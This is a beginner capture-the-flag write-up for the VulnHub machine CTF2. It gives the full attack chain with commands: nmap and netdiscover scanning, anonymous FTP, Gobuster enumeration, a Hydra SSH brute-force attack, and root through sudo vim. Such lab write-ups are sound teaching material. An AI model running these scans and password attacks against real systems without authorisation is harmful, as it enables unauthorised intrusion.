# CTF2 Writeup

## Machine Information

* Platform: VulnHub
* Machine: CTF2
* Difficulty: Beginner

## Tools Used

* Netdiscover
* Nmap
* FTP
* Gobuster
* Hydra
* SSH
* Linux Terminal

## Enumeration

### Host Discovery

Discovered active hosts on the network using Netdiscover.

```bash
sudo netdiscover -r 192.168.1.0/24
```

### Port and Service Enumeration

Performed a detailed Nmap scan against the target machine.

```bash
nmap -sC -sS -sV -p- 192.168.1.24
```

### Open Services

* FTP
* HTTP
* SSH

## FTP Enumeration

The FTP service allowed anonymous login.

```bash
ftp 192.168.1.24
```

Logged in as:

```text
Username: anonymous
```

Files discovered:

* flag-1
* word.txt

The contents of these files provided useful information for further attacks.

## Web Enumeration

Performed directory enumeration using Gobuster.

```bash
gobuster dir -u http://192.168.1.24 -w <wordlist>
```

Discovered:

```text
/happy
```

While inspecting the page source code, a username was identified:

```text
hackathonll
```

## Password Attack

Used Hydra to perform a password attack against the SSH service.

```bash
hydra -l hackathonll -P word.txt ssh://192.168.1.24
```

Successfully obtained the password:

```text
Ti@gO
```

## SSH Access

Connected to the target machine.

```bash
ssh hackathonll@192.168.1.24
```

## Local Enumeration

Listed hidden files:

```bash
ls -la
```

Discovered:

```text
.bash_history
```

Reviewed command history:

```bash
cat .bash_history
```

Observed previously used commands:

```bash
sudo -l
sudo -i
```

## Privilege Escalation

Checked sudo permissions:

```bash
sudo -l
```

Discovered that the user could execute **vim** with sudo privileges.

Using the permitted vim binary, a root shell was obtained.

## Root Access

Successfully escalated privileges and obtained root access.

Verified:

```bash
whoami
```

Output:

```text
root
```

## Screenshots

* Nmap Scan
<img width="655" height="760" alt="image" src="https://github.com/user-attachments/assets/342966ff-81ab-486e-b0f6-b38e388e3f92" />

* Gobuster Enumeration
<img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/a2ea8f24-bad4-4bf0-951d-f56092f29742" />

* Hydra Success
<img width="659" height="769" alt="image" src="https://github.com/user-attachments/assets/d113c793-ae05-44eb-8934-0d08d735c093" />

* SSH Access
<img width="645" height="800" alt="image" src="https://github.com/user-attachments/assets/7a5c5808-aa1c-4f80-983c-2e6e1c017bff" />

* Root Shell
<img width="1609" height="968" alt="image" src="https://github.com/user-attachments/assets/39d1c450-d21c-49d3-b73e-c392bdd0b43b" />


## Lessons Learned

* Anonymous FTP enumeration
* Directory brute forcing with Gobuster
* Source code inspection
* Password attacks with Hydra
* Linux privilege escalation via sudo misconfigurations
